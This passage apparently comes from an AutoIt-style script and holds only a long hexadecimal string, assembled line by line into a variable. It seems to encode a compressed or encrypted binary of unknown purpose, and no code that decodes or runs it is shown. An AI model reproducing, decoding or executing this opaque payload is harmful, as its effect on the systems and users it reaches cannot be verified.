F8E19591D5CD138D981570855751146E1D84D437D2D93F2955B0ADD898D0A4A16970918DF1FDABA43104F1DB0EB10B137C9048E7CB6F091207427ED1E6D6B94F13963B67529403595C01EAC131E38242B719BF4D838EB2FD05BBA166B2746871E41490E87D1D85806388511A7BF2C0B289496055211522100491CE53BE928D02C3924442E974BE0E4E8EC282DAF49A0E7EC035D12CA9F97654CA9E8CC087FD85CD8241EE535045449F56E6B2626B2B669A4C00450E42E054D438714BAD981778719A3511295DF5CA350934F3CD9029B607BCC931B34B1EA370C3072ADDCC540DD0779FE265F530742681F753C2077AA3E3C7506D42417EA1EFA85E307D73882113C8F253F71BE16D744DEB509A9D292BEAF35D42B00A9114B0A041A484FFF85554641201C2773EB09E2016918FB1686208EA849186B271753C7E1D7101C3202D0595F24BDA8099C025026490EACCD9A24CD1D48D248C078ECFC8256E8782D5F84D22DAD616D40BAA595196D40E0C3DE219689775442C3BEC2B9527931143D43406FA514D42AB574C04747DCD5FC44BD253F50D3886F846EBCBB6B3281CE14C94B6C20"
    $sHex &= "D5CAD3C8BE94466F61030C896F80FF0200E48D44D1258C831456B1A04195A4A1AE690CF0252475145FA6C84479E0E0EBC84281F54881F4C1460A1909CFAF6C82819725FCFF6618CD03A0F88D240B8942C6E2E884CF31411AA1E8AD6FE82864FC3267E85F34C876596322941001E4DAC407976AEB141E5C05E81F8F241C9576AEA50608DBF079922CE64B1A95817A01992FEA7486F8103E4EB8B849E3D837C1BB3B92FC0FAAEA4289CAD087518120AEE326C3B05B3E7C27AB0CBEE5922DD3D4280C0894CF8C02032F477C835D3AEAAEE47D62CEE714043F8C9B4677D45819890CA3C2EB54C128579DCB8687D04EE80346C639A827841E810A798D1246522B6718C01FC042FA3F810618C1F9DB7C221AAE23554A1A2E0E6A21A085D3B0662290A7FC50D2406299F3A83403C275A8F428D6241A8BD312038C635195ECEC811A877585D9208389841451ACF493A20BE0FEC91E14AA8B026C1FBFF89112E3B8870F84A6CC7B093422D029FC2FF41B2922F4C7F46C19F21A900F88C7CF98669022E9495D1AF803901DE1015127F7950BB8C68E41A7443C9138FDE033C965A8D10CF8F441BAA835A1FDBFC15721E418339947C196CE4C61E7507E5BF202972982CF64590D7AC0760CCBEB3346C486B2959B1601239A6E7FE6CD0D802B1FF401FC8B4908A7402C02B9A025BE1490F45B8EFCC25DD352B52A9E2ECF7C2030EB964EAF057EF2E02DCC9825E20775440D800DD93BC108CA51CDA5DA6763217D77129BBC07C21DEB498BAB87117A9A0949F06A184A8390E456F0E4EC8630D6F0C6401662CD2464AD5A001F1C211A71247CF64EEF431E712447E383243332DA820279CE94C9C399345DC91CFFCE9C0914B12AC4DFED3084EBDF1035BFA1BF28BB767C737C8575AB3BAB6C79B803C49727174000AF2308C260E18693C0B1A3092EB43185A65D7D2BB9A4F32993800C6B13F1E116EB11A374FD6B74032262051974270EFF0341D16A7D52CA3570D710FF88DD2236EF1158251FB53D024F3CA3A0158B7F11C4A7640E772C37A8918153AD08345A97AE1B71085208F4EC25AC765DB4EF90CCDE698105516B9CA1EBB8ADE56706EFE2FFFDFFFF9807F9910D01AF8C0176AC2A48010C2402DCC8406909087D260B40744C592CA829B5961EFCB31D0807933E4B25F0850DCC0D2FB76D7B5D90F07D328703D0CC3C0C34B71B49C8B10F4B0F9015EB32EBD1C452B5D79B407C0F969B8D7304D2C1E24AD328960455313BE452824B2FE2027F0FA611894D07B06C39CE548237743C6A2005195BC19690B02F8D7AA1A11E4BC19D081FD70DED567DA3BC3D9D3891468C4C1951909C622CA651D96140B72C3F82F1CE146707CE2401DF472B1B1FD389F8435A4BF25ACE3462193410F803C69240E1120195183091"
    $sHex &= "7F78CD3EC0C092A0ED01155B29609FF1A35121E39E75B9EE84999A89085D387249B85B2BF81D0891A5F62E39941BA32E1891F03E8FD001EB444C9146C835B4772EDB487420B76B801D6AB02D71704F423314790F1448F4F01D111BF3253B1C1613C486B30753F249588DAA097F184F7CA616E5EBB59A08912C4FE54FA4D0744953A6DC6469B32821A4F5E9F73B36C7403005C181536C6D337D140A6379301E1956CB748400B04DEF6561D5C209DDCB9867E8F984362F8E072E497F02032CE0019160CB455022B18006DF2C618DC25958171046D2096607164EADA1FF1ACFC608DBA05E2BC7252CBF3B4DD2B9A41010B3AA602D0A05DF2134AE3C02530192505F9BD600011FC9425365017F10B7E355A86477BF6A0D3FFE1304BC80624C3319C43204308B3A5087F97C1D5D146EF47DBC4E107C66102B16E9104E89293488DAEBB8BF2356912AEE504C34A509258990A220963CC410ACC49C62451A5D1FDF03E3111BB1A35EEF3752499DA80A1A2B4B4A99A4C8C80955B7B4DC91197A7D331210B807A4833F0F85111B81C316908F097CD8B28E554C68FBC0150D1C044B19575A08192701721FCA056263956C99F537D01F0966DC7C227F086DD876180272A80F676CF6C497E6290D4B8072D0D4D40867E9C97C16D0761E2512384B19495BBE23D698A8A5294FDD2E0A615CAE9D0F5FD691CC50500FD4E6826ED6262FE8E9E05837A131F4E340C0CA8BE50D439E029E0343830EC69670E55A42244E73429997BA88D2138269B8C06FC8A468A04CC8B766056EA5F239694BD0E83981818409D4D87C4B2DF9F65E2308820A8D2B3DC2601CC09F957053251D9979812B02F78E11252D53C1FB0334669E450C892F6B436084379047CE0CACF8F10A4B8B533B5A7E112D62C946C8C4844FE72851FFB054E30179618DFC53E3286A4444087DB088DA0C9F510480258B68C2EC941318229F302147412F34CD7570FBB08286412401FBE8CEDC0657FC2EB309CC6881EBB2634BD3093B62422A5413B8B984DB824603CA9B6D1500C809E1BB714736B066A79B348E2E187F3809E1367E83BC707542B5A015D33FE0073DB4DB3A993C503F005860C9CF306B37B6D9C0D2051F33502C296F5A31A4AB058D0DA23F08C21788340BBE501EEA7B69F81B601C69A826707BC06DF92C5CE1151457F21221BE2520B72428CD100446652B1184954CC01D14818B14BF44ACC02A81654FA181762CF2301C1B025D8C825AB5217F0B186C14E18350216A751FE35459EFB299583F630AB22D2C3B7F43110AD586DE3B7FCC865A19E50C794A3F0D215D5A2742CE923475E70A8618D10865256B1D36D09137D1D7EC811A12CB2BC6B4489C610EF0C5C95609010B5D5F6B6D000B01017A7B74A3241C038D7F7044EC02CDACFC16"
    $sHex &= "F574410B4469417845AD67C718E755BA313329180A1489946E5C4BE5C2BD424CB2AC471F066E98084311CBA7618D0030C27D129E38094D1274653A183C9DF12474577C0D2AB810D0B4538931F0B060367905A7711EDE83F72B940ABCA5154A3D49BAB7ADC5441F0AED0CAB72C1F8030355F78958447D920A9103ACBA049C0018DA8175C4972EAC74323C057531D89D3276BD0201190382540A304FAB3CCA1A4F0038D6081B1C2BADD1935041232C7F0217B24F1909BAF5CEB1A6088016081B185B7290DE620F6846B30F6014815A5C4794F0A46B3F1D214C95EEE53C00125B2CF9138416F4034572949C65478FAD8010DE04778F820C657D53DEFB3281ECA779164881815310A4EA853D3E349D7D2BCB7E25F047583D29042E1268F6B21F6017524B06AC76C9ECEB0E2369BFB265F87E42FBEF081716B208DBB0F4E7D65D403B01762623316513B41C0A818A26D65E45E403A4C1FA081C02793030C7CD34288851039B0E15801DFDB603CA431837B07DA4DEEC97A6C1E0E3882B8D10DA010F8E1D14DFB29EDBD7E204CB56C8F1504067189EEF765FFC0221FC01D8109503E01A1C476B03D06A03880F8C564F5C1B1052A6BE12C6F8F3FD763FE42BCEDC780F91F0073955DC34B3857C220EB3344C49E445F3E02BD0CFF00725E4E10D04B9E4BA693E348423401021FCE83C4370AC015102A7E403908616CF942B3BE8CEE814C1785B764A02615EE8DAC80DC035FE7BCAF7E2AA74E5F0571242053BC80F85C72E3800BB5F024B06E1B6C9C43BD1995B0180ED43B6ED51ED6ADD951EC03D964E4A45205B704B5505DFADC12D0499DE65A51940A53348C18314D89CD8F00893B55905718A2888746D8C490F411F34AB08617948D0ECA7041D6090D8D4E7FA163E1EA1B74FB8766972C3DA24D8D2D4590BE5691EBDD8D4067509781E542BD12AD0690244C63CF843AC92D0B9F4459BDCCF1C963A284004AD6D85AB13F03B048D3464F0036132222CDFC2700CC727CC21E49ECC8717617C3CE43BF043C2637142AE6EEC048C8227AEAD716ABAC0937042E8EDD0543CAD9DEE65870BD2E08CF44F1131C194E0B1E4AAC555A88CA27FD011BE53D5EACC79CC72D064AD260C45EFE8AE595AD4AC0567C0CA9AA25AD00629DCE101EE792B41C1C642073B96F141CE2B693839481181C9502B03BE6395F5EC740F6860B25D0A74DA5ADF32D8FA9E15500C3B5158E1B55A6C3685C7589E6E09F8B317013B4234732F0B451D6B3B3415923C8073611A8B4061670C3690E8065F6DBC66E0391F78E51122805590F48B38D293DA7142E53501A452F7514AF8206B4677201A00E6340F3B2CA1FF60B7000846F1D2D354A04B5F38485C8C6CDD570BF16C099F211C87427B2A27A589B1489494A09CE3CCBCAFC4F90D58"
    $sHex &= "31F4000F858C42C68118898C9DD44AAD45A3F03E0EA94AF0B5A152F725A9D053C2D20D7506BDEB0FE021DC381D082173E4691A4D7B9E571B03A1D8D8970684F0771BC3E4DC8596BA2B0C7506384BE8593408B765C4E0DBA7287C1B2C13EB8C0CAFE501AF5FE85D77B1324C3D69C504655F003402F0A833F6E91882981897E5F6D04D3C41BC4536CC8707BAA61202FBCC22223117A8C8E718B03482BC8D08282CC431D2F0005EBFC24026A59051F1A5203051FD4EE129D334CF5542E0E0EFD6872CB9C6342FB4C0C87127164075657703EF00E40DF441868B2938EF346887A5512446349B8939B1A1CBC609C7875434080F98F15CDF7E01E083A581D67D6D5217B718EE134C90046D44219EB87CD87256125803B3493E45B2083BBC2565C7EDEE609844C056A30351D7F7BA60D3EB13540575F5D2078F848A0547EB84F106C3518FAE0F830B02C52E689D5C17C16AF1CCA266EE015554690DB47A251695032ED80D591D5B2E750A400BDBECBB945E94DAC072C460566D6A9445892FB03D1600D43B427F1F6CD03B08F84C6C5C73155C6A0513AC9502393E1DCEC005814F85FC1D69CEF880C3CBEC2F36B2B8946FC4F43B4DCC7610203549C20F13E0B6C0065672D13217ECA5C0B85153BC68B82BD12AA969050748476D8D4AC1C1888D82D789EF365A0C36DC8913B358808B8FB37961F3B05A0A0ABA5A7557411AAD177538C758A678DA98AEB4B00F04928B62E02D1C53040C89053078FB6819382EF15B0D565819164FC7857513DF96439F610D0A6B7125850B6B445D63C4643D603D21261CF080412D819DA45EC3F4B9E40178F405619EB19D04359E588162DCA3F00B93BCF083C004E4583C8ADC0AFC201150B72E60801B4BC6086F8C082DF945EC50ABD602F1B00486818D208CCB03E969C2BB880F6840A39D1FEBC21BD3BA4F17A8207B229C26ABF8B2E4E160F900AC1F1C3130BA0C7DB57DDECA84F155F48B42B87C3061A920CDF8832B9E29180329394B674962072C8D9F8477CD21152545AC8F05BBDBC675615FA0971DCA50296987DF05FC076100B6B4B39BBABA2E13BF1750F78B9B4708D703A4411C0F201C52DF875C23F4B63A1A1042D6024D6949E888C39770E35463E203EBCCCBD18C35966F26803DC9048B086B28B29DF491950A56FB61AD4ACA2613F4D5D8286D35FD771C636DB7A1F19903C113CA9C97B00E52EC7BF332814821AC9759084AF453E0C372F4052C9822107E9382B02CAD3850E4266BCDB7ADF4949418C221A09C497C435BC3ABC1A5CF7D047A61C44E501F0113779B402C9F75DEF218782802EA0C73ACA2932AE2F41843D57899685F45BCF09508782985DFE2D0BA5A052701DF06F0B3F00FE384361C16F0FB31D4ED84542787B9CA56B2CAAE1AED2749036936"
    $sHex &= "F14163F884F029B4BA30B69C19034E8D895BDD55C2C9496B40D8D70D70CAB16A7F81D00DB24E012CF00361624807013118C65D1B647EFF00CB64F8210161B1990224F4861C4AEC14E385F490C16417AC0101809F230938D8B79E6A99590006B13FB50D04A4BE2C8DAD20B5D47E7103816860BD502337AC532D8968CC59A1B4C65E30015133EBD293C485DC45DCFE84C89A2E8375DA2616D14091D895D84AE49457028995D80B0809BA7748CE1D3718943D0DA2A05CD81F565A17502E0AF2C7E2E48D8D6DA6C9EA0D51E4FE293DE39795C54F904671AC89AC9F74E995D401D4A6E5942BE9D40B9A27907D0D1B3703E80B40DE85D56ED499E4C998AC77869CE18D370D5FD227BF8B134A7658A7F63C5344690332C53F34FC7ED8C5CB0C4037F12A0ACE8EAC55E01DB1F2702C23F2E8753A281FE75280F0050A6BEF01B75438CC0B201DC29EAC4F86BE65BB9F70CB242DA352E00B0882B7CADF67124101E54D2B1AD0378EB9242104178038B8068431103B8F18C0B1059B776B857DB127E46217BA6FD2CE0312DCB3084FD88EEFAA7166044E17809FA4F8F1BA351E97515765A47D2B6885502CD0E0DD84D60B3370053349D82DC5E9226951612CD0A175C8149DE0084D323C5B5FFF756145DF4AEB3022D4323BB6D47090E31E29988082E71383C80188FD470AFFC1BCBBBC7DEB1268187A6B653CF3EF1C27351C91C893D4730BC78D40C0720DD2188A711D19890D8BFF8FD6C7DB500749A08B359D25207B52CC355D0AC276F337D72B9A01B931180C1CF97AD6C4055BBA65DDDDD6C342509F9B24E1432BC98D415209B8D17F7FD6B02508691D0C5F0F64AD2DCAE1016B0257C07E4E3D261729B4B7F915420116FA44AB7CDBEB81F99775101655FA81FAFF0476BCAF29A072563D1D104CFA9654AF9B350254FBB00D922EF8EFA1A7A9133817706D89EA02AC06906A191D9C18C8041FB9037C5C802EC0A5262EE9210D32481FBF98973626284B1F74927041BBAC44227804A27C55E0317D812BEDC81154408820F76F195A65EBE1FE2D1E00E05ADB2FCE84E3828486EE1E1548800AB12313EB77E80821BAD340A8503F0CB90FD6C2D80B09751EB95B06AE2284186109C339D6836D0D1D025F65180222BB03248D15029ED7218320C985E41C974DD3F085E81F1242F885760002CAEB02A60218BCC409CC5E01AD0F83FDFCB060A700C57F47346006CA28729D9D0DF2758B45ECEC6774335F81E1D054A5C34530801FF65241D69B0633BC3F7A9D034FE59DEBC5A0801D25AF0C7C443A3D00D843EC8B68C00E18883BC4D9ECCCECFD5840A877335D98F4CDDDF08810D9D7EA1AF80EB00833EB7C370AFC8B782E66D02D78C1E80A25A00D6C1951C0541115159602353FA6807403630305E44101A4D202EC"
    $sHex &= "25FF2B6208DC00FA3E8CF6C0C908C387F0603D788FBA54710CCA8534EBFCBBE1DEF27C778B4D913D6613B308DCBA5E5F1F1231C876EBE00633B66E1AD2563E9DBB1FA06E3038282CBDA2BF558203A469E2FA349941AA6041CBF7B59A1680A1826F360A3F778EDF0C196403C335C1E90A5903C14A1F2D15C688027F54E95C034640DEC381C19B380A8C83D00EB22D08C2C630893E782BC687F088BE1D165F053EC7B8F55DE4D2E602FC01AB1EEB11CF8412F33F0524B8747D23E47BB658B3282F4F00D86211C374D7A6E07359195163DC661A085C051DA3134EECDC2FDC25F8D1ED8E1CDA3F3E0A07AAC0264240E115174D660A9983731BE169F088F3C5A90B08424A1A5AF3C3061FE2C872C05E16D0DCD738D1A0D43C169A459500015ED13E80F95D0C42C205E0EF8990CBB0D33F8002A934DFEB7BBB1207F0621D83640C3C06C180AA7B94B93FB780173019E473C3B7C7ACEDCF029517E91D290355EC06398A25F7635AE918C7398773525B84D8071B020BB229D8D3342F14D0F945E0E0E0F1C551D0ABF9C1401A4180A3384EF91CDF3E0CF262FAC7A741A906860052691FC0A31F566C2993F9BF0C6C23B9340FE0D31448C436C5D31213C8A5E9BB1207F00CB4AA6325F5442B1868C9B3D5E8A021702D0748E4094A42EB29E71926E10A69F306A5810D0439E835A87688812824FF1D7A25163645CC6A043CCB2A13B1907CBFA14006767D9353FA4313C3030F878564B6B2D089D077CB105CDA21A2F389011A14F026698DB1AF12420881A9557AE033FCCAF4FD439685F1C5730512EE8ACD3C267597EEB47104192111CE2ECC3AC4ACE9A13EDC15C6CCB481B049C900306892312E988223191BE4ED8DF0666BB5B488E8BBC9534AE672691BE8E8E81908CE5440FE2E230C3FF00182E984586A149515224A8D7BE197CBAF080A03512818380FAFC2F408CB0CEF7063D86EFBA049296B305229740BB9B9454820517D40B80030802C88084262E8121C08FD8476588772DC79A04ABD21BDDD8536DC20DC768E10DC5B77870BA1157D85DD625E7CDED4C9552126CA768B14DD403A06676CFEB934A86880A2D44D0D96A0BC55D489919B6C84CC33D8D8613942877D4CD8CDA4BCE70BE7488EC3D8D442350C5C1361CD3B150677C87606AFC9DC25039B3DCA8FDF069679A1DF0A7C0F68542F0D4C0A65E082F20C7BC330C75EC4101DB8040865C0A7C329847444853F285D35A05703F8023E8C7DB0B29401D174CDFA6025A00D4D9769660B0F243F2484AEE9F2B9F4CE20058699BDE8F32113485DCDF03101E114642A018CEFFD88203772FCB90930BF4278572409D9F3A53FBD79425240663FBE6072D2AE19707E0858D98E06F1DD58ACDAC81CAB2DB3037A5BBEDBB14E4A12C0554033036C801DD829"
    $sHex &= "DC87E032801C21E4E8144CC900EC71DE0BE1CB809C9CA00305BC8623B3833B785BBEEB5B19EDABBD0F42FCA32E502754EB312B48D2D54EAD142718814311A9D9F9F33C9B5722D306ECCC055E7E9EF79ECDC6CD0AED16AC061E3ED4799EF61F06994E6ED0C0801A1FB22065BA7D3A76777110AA7469ECEAD54CA442BBF65FC30C60C0CC08798DAC20DFACF9948B4DFC13144662018801111F6322850308B1A57B328520C5AE9570D89E95AF1825A56E08EF04813F811DD60F97EC6319A82BBCD4A3B7FA49CBAFEC9801281FE901E5AFEAC39157000F8CFC010D2961A0F204C2028786629F40A20EAC54676D6C18E01E6D2981F9F3850F809EFCE8C1E834DFB6B3B2396102A65C1025458E8D2A890C3FD0810D43100FBEAFF983E4330DC47A341AA2EB1CE0EB2584BFE4DF38FCA281A642E4C826EB12C6071E68874718BFD4037BE0D87E49E1F9455DFD81F8341227207B482B0C3BC84D1DA4435351260A3A30819F16F0E0B70F61EB9FB7382DD85E221724184F43C4080E9024F89D98A9A0CFEE6A71D5A632A276231E2F0225B74D2718F8A8F4ADF0208E0F0169543E1D1416781BEE8315EF14513AA33BC3832064CB6C1EFF0E48C1E424A002EB17089684F92D24BED3BF126C38DCBBC704CF5E0A83E15103EBB0E4572937288945E814344EBE8A40F40024E821A4F682611A51786128A7F03C0A2FA40B480CB784676264A8027212F549C340BE75CC24DC2649042820755D75D0C140186CF3CD432EEAD0D01B18D418C2C384342BD0A00F3BB2D01279D0D152584843872B14A82B5C90F678F9E7EF00CD41AD760CE0EBD9C09804DE6E7775630261B81FC82F1348B8CBC0CCB1C4B03BAF5CFEC4C48B45C8562C5C658349AC208900C8B322E1C0043E108A24DCC9BAD21EC71C754CA01C0A095FB0BC04BD0118F06EFE9D39F8B42D8B1051982C40083B048A6E0F4E80F60CBC892DE8DD5C0E805F44A8BFEB1DADED4ED622613D7512E3FA5EFC1E900416C60248BED2A608D192E34710F02A8BDD98C04F278443233AFC42488DB2265FA6E9A5D83C14D428B8103E30348128F78A62751D40235484CD4BD01B53FD146B14DAE388440F511AD7C087896298FFD00B057C87DB23EBE09B4096140DB3791D4AFC1BD283EA2B14D7FC572AF26763AF016CCC1502E9407F10370C7C203B38C592564D6113A449D0842114BE5200DD5DD453235660482DF918F82C1FD6204C107DFC07E1EB594DD19124AB81835D6E7B3CA805E4D634BF171694C9466F2E0B6F6057504165D3C5208DDF0CB306C96821B46FC1D7C2DAAB53D60AE8B00283490CFFE9DA05C137C7E9296D58720669EC13F81410EE8D21F556C9D5B88D1C298744D9FD5D3506430A250320793048DFE89D28B1E852A5A82D2D5F002B84164325"
    $sHex &= "1703840739E110827E4829F1247D4845EA42F0AB91443C4B58A7BF7A8075A8D16AFB7189407DC0BB91318520454275D8E1C42DE0EB9B9F7456C60D037765E4995204E4B4F9FC02898225F5DD8AADE45D40C27587103C01383592B40BC9A71C169E2C6993C04AB9ADAF1E5A58F2A952E4A64C5AAB80875A4B53D081D4318BECB9F49BD0B50A30A9333BD398D804EFFC5985BC6308174A191051110303AD296A598A055C873B6CC7020C085B3B656A6305CD4DDCDC92D7D6DCD6EF3028B58684479ED8C30B4C1CA4C2D0EE9A90C0476BDC25DC477806F04BD8CD8282B28D2696ACCF522FE0FD3EF3C8022688411EF0D86D6FC51308798173D2340D949C5F4D55511D0E0C465502667030523AD440473E2D2C0C444A538D514C0D96A37028893A434071200089B76A1147BADC2618549189419EF83010C3E4D9E4A4106F970280DC04596D8DDAD73CD916AB4C53EC5A85CCE1C04F23FBD9369E25036990DD00BDA57B033C2493F0C480C20A0BA00E38D1DAF371F67C4F848F95D47675E4D4FC1B414F44733502B16B11EFAC0B5CCBBC87911AE910BEE6C4E4A4AE44C1A1F74874851FD71417C275CF50632B8CBF102B99A04D458C54C857E2C1BE4069CA4D5FCC8B14380F88133C2AC0230F84FFC0DD51220051CEC0F8BDA547EF1B38A171E8E5CC260D0B003662C403A4C5168D33EF8A3AEC66C1C48BEF15C2ED6C09406C440604050D1B82808FC42CFA759B471552434C0EEE4C02D870A10CA3451444106DCBB636ECF5200A08CBA4170E9220AD4F432B5CC1054F890ED95640C1815E8F709A66A8A74DC14D0D1DDC823138B8B2A2709757A6DE943AE013B71DB44644C14519B0D8B07C090654E0227AB0AAADD6600A5B05130F3ABCA90302BD27B0F3C801E9BA6593ADEBB41609352D4D9D666EBC45E03BE665AB289CDCB5B4A44301663085B46B17F8EC7E438848CC7E4CE5754689F1280007741E3AAAAD294D31F4D6EC2B2A7B496A89338A0DD66C00D57DDB80F0A0BA8D376A0BD051061669BDA4ABA52050069845DAC8F9E1E048B94AD2017E5AEE9600B7B05164816590FE28EC68CF6EF690347659AE0CB9194F948164A4843C550086B0EF15D42AA414980AAC56B7D52CD9A8EE6894F353B68ED5A6E72CE9B0704FC654C9018E2EA4A04C9C3AC4B55001B87C01F7BCAC398752EE20D3096C6E6B60F162752E67175F1B4CD105DD0F6A03112560850BC02BA91FD9E406BB04A5CD61467C0172B21D9C20FBA10D0FAB9351507E89BA89EDE07425898380E9B0B5DF51099A6280693592DE008EC5FC190C26B01AC02F482FA5950BCC041158C5D836CBDF1F0077588F7D53DC904219383A150805E106BB948758177AE393099C97006974433F214D10597A00AD6B1859346FC7C33289A5CC183D"
    $sHex &= "E1820687436A1EB2354D5A6212292A469A60602605F8098DACE9D2BF0C41595B4403007D53117105C16F506A738720B72D7B29726410D64A133B2E34B996C5D3FCB3605B8CA29F851A11002B27232B2DB4D12DC0E3DA650D09382DB049134309E6CFCA1A47A02BE51D48780D5147F5047C3C4C7218E36D7CA7114B181310D6C1A4615E7E464B69978916A30E1B6CB81B7F25EBAA6DEC55888C9656174D060723E20073E0C88ED3C018E1DD8C37D656168A51430CF0085A9713104C30AA6886F378C179B6F50A01F81C4496FD925600ACF30BC88808BDB9841ED10A8612CA08885549D9CDE51E2445C810880A4C0A045AD78AAC376E59581C17107310E8927A166AFE6D7718B4826EC751E9DF1FAE05954F19AF85021847A270970F048B62153F9F1BC6C15AA449AA1B9B0EEE2B176D61708107EB2F9207BD18742D2D88671C86B0180C3DB4DA80A95A94672F1C029B273985164E1F5626DCEC90850F43574C491169B1F469A31451147FA7F561C16973EDF653B086533514565AE19E90E426EBDDA6E97F5B4970A43B7DF47520E0544B5BE178A29DD6503F14211012B186A76F2F37601EC0F293F81827581A24330E2E1414CC5009B551D1F8A805791B0C7020ADE2BBCD4C14C2C5A462C2FAFFB99285ABD35F846B7D7429F7F314DAC2391AA74750105319883748681A8F101C53840DE1CDC6DA0509D005C86C40AE1ECCC40DD8D42A8DC8E08DA220ECC0D28D686D80C321F38DAC1BE8DAB502B20101E3665C7CB7A7A9FFD002B9B00007E234029B77D9B403A41A3CA803F59E420EEFA266D438D5B5861B848F10DC54C6210DFDBA69895EB21D1D8600C0F265E2E8407B3DA60780FD80A64028809F34D0C237104AB8092FE3E46BD2189C3CD1844E8C650E9C831C902CA40FA7CD847B8571503040319B10B78BB5318DD62DF660B70C295F764B6A4C9BB2250D0484040701AB060A793127432D81D7149300C815BBA2E5A4521040DA004EBCC2B02C99D801769B46C1F214196372ACE46335D17C4CE4BE06EEB304C326F809750A83DE1F430D8D482557A41CEB300312BF689008754BAB36602CA2A998C04A8610A2112E9E9A9476B3845C5884946E2C965840BEBF6231D362F21425BA98E0116B1F37D5E027310809F4E8ABE0E368E416EA91285DE0ADE80CEA3AAFC8897D96021A807988274E1CF0D18C684C446A380071A18385964E90D5900A69D645C402F0036D9D1E4BAC218802C169D7FB50309065255273B8F5472C283A907A1058B1A05DC2BA5B798845D38277404DE96F9A83C24D917C6DC18442BFC0001DC9938A7376F4890640279DC4412851786B6AE2D81CC80F9C337A29C8DB38C956340788C101CD7046E22E37626C2EA532ECF7A3EFFB1C2F18DCD00287BC5E3008AB31DD44"
    $sHex &= "D1CC15E41377E4CDE4182C7121F47CEA02293828DE88F111C400E02673E49F6049E5C9E093ACDC7C425A69618214F218190421A22A1CD5368E82641C7C9FDD7913DD0B06740B1109740AEB3641FA87162CC60274EB1413DCB686C01A94C60E016B360076803AB63FD8B8F61917141718F328E2EEEF47448A1C001485A19F8A306A884A08995A8D12461F62AD35C20D2C5F224628559B4B182649C95404E16E34DF40C85BC29B725635507CCA241F062438EAD2EC66ACC28E97FA533F4C60D3E25B93B0D71B0B3EDBEB9D860D42587FE70C92704C4C1DA41C406199788B33851C589BD7690BABDAC4AD6D3D0A27C20E39BD830D8EF9713C884176E91A9C60ACDC162F470C8845E840E2AD5CE8B3E94E8C583AA6D07FB5A303E08D15A3C0E9C125E1C141990E3B886DB58849750DA056A1031F924473B4BB0C1348E014E38162BCD332F82EAA1CED163DD47D58C0A4BD1AAC75E380B9FFC3386D232986F8ACDD927247FFD800E35D63FC2FEB2759B75073646FE58875BED91279FC523AF58DEDB7ACD08801059F2CE1AF00A60290D06A5001A7A64E55DE5CDB0F6A0858430ECFB3F390AA7CCE084E61483180164443250449E4E6B64CFC1D45C02450820F48375934C64249013F4B891809DB58766B3845B47BA56CAE2F12979BBBEA0C0B60D76A06C55D8DC456939FA3D021A8C1F349DB5B85AEA35FCF6FE982C20003973B5F594E4F8DD1D8113BC64E906689CB3A7208031A100C10A7E3485FAAD101F850B420C1A11C5F5F5212C01A352B47964B918DC16748054693F8057E070385898323F4C2AF0DA34DC824F4F35FE50A167208F50C66F09DCDF8CE48115CF5CAC40C230005C16385BADC0C2F7227950A89193FAF6A05A52D29804F0E4444012E1A2F0901FFA29275051FF8DD3D62EB3990465F8A94858E11C220FDF060F8809E2D69A1616C02A0169747052C2EAE7B20E9A380C93102FF085003302F477C2307103F63D5EF54A7A9CF224C00B17AA3907AAD77084652A7BB93021136048867FFD1D5104E4851C81D94B064358ECE0478BF1A7C1F17EF1F15190A0225ED16042CA18500967C899D5C1F2469681D1415F81629032D01D9500A16990B763E82A04B1E24533FD25394D8FAB3E3027F0673941F5A0B07B5CDB88BF9162CB673ED35DC1829582CF6AA4218153C1D3C9F12B7039D7440826B3F2E2A1C3579C964777F53027B6024DFF069E7C60E5DA1676606FD65F483C0EB06B0C5F204B554B9032FF4E417027EB246900F8DDD5140E094910CC5BE2473203C90E58B1CDCFB612049F4014057023E091C285F7197EC75B43DCB48144A5E1837FA7F9C855485E826440589034B1BF6EB6CCF814BB81F5A448DE8CB3CF0D58AA917FC8907811DEBC53B218B4E2FACDF8A2ED36009D3EB"
    $sHex &= "1A52687601014CCC9860DD003EACAF0EF0B24B3AF63618F17D4ADBF310A95A9A82467A27D949492E8403B0F8B8534FB120540D4C292BA706B0A0BAC1DF152A606675BF733214F8AA9DF46A028D233994320673341C56ACA194AF075D2E39E0018D0065116F9D1B04DA61B8422DC6C1A92415F037019BA56B0FD33AB11AB0AFCF1F6E1A0339104BF469B4565D40385204302A5D53F0CB72B3A50DC1E3207E30017326BB75193AC00D00A9FCBF9A1222DDA69FACC4658D2F1F31CB1AB3F99907BD8DC90C2C90E36B9708CF12A7F8EBD24161C405FF884B00BEC755AC81C81A14F19FDBC4688DD1D0BDDA400BA95F9D83AD7351EF7422CBA62A1660095A6AA53661DC234DAD81B9AD6D9FFB3B45088DD5D158049E680CDA4F246A9D58616A0E89CB05B961BBFF0C446A178C506BD92B98585589DD2A9D960E0426F8DB5238A738D57CB76AF46207747AEF1437C0038115D13F7760E41018B316CD6A63C03A8049BD7FFBB12648F3C72CEFB1A443C616A3E1C16A323F630D3EC20A60DDF3F68C2C30D4E3E03B0A087E1F485E18185E74C39071AC715957E84CEB29E158C410F9569FBCD66FCFF34D2FA815751F1E6424A6D1DFF82E9914420EB8017E24CB11DC616007149B5840EBA520C52E88EF7D27F04F76510EFFACE703AE3B0C56EC802B33318A81FF115EC84F1BA00EEB5185AD9774A45EDF4118D14859C04AC61A8B7D63003B648FDB52D88EA864FC1B3283AC2BFB9B0FC41BC7D24B94AB8684772FC8C306B6D300BE895DF3F14A50A911BF6F255319A155FBBDEE3685F131D42AAB796D370823DBCC2445FECA00100000CDA75B1152983FAD721B6A28008922D8CD269517186149895838BFF7101E4C8C5F512E49E0369BF961EEC17A1BBACAAF00EC615137539720B301F494565327F0812CDC5433BD5AE88F18D0D834CF244A06397211CBFAA63A1F10170B2396BEDE761768E8C2D919181D58FB01605304E175C7A94CD10DD1DB64018F539E173380480C750264E1E10BEDC2100A4F928ED619F7FAB2B62BEA011576015249C2923778109195A2C3ED1015EB6525B8C181885003AD34FB68E9E310C5C202650E5DD66AB27F3F0818EC602B782A36CC0FC10E7712000BAC67161DB62BCA520501DD0A1D033F046270045658A56223FB5E140119EE081AD23D034D8D5488F61B027AAE40047353E87B42051843C65A8009FA40FB246ADFF6A38E7278440A053F348A52190008DA24887206A427A62304051AD0AF77A8BCA771969AD5F3884805024A2DC265714DCC3E5901C520B704D370A7F21233D29DC62C4A4B9838DF303F30E30350144336B06190614BF0DB81A0D0B9A75A190CC0EB81AC401516686C03030F2A9FFCE61BD60DB3A5AD128C8F9C8007C1F0A16445DB49036E08ACA343"
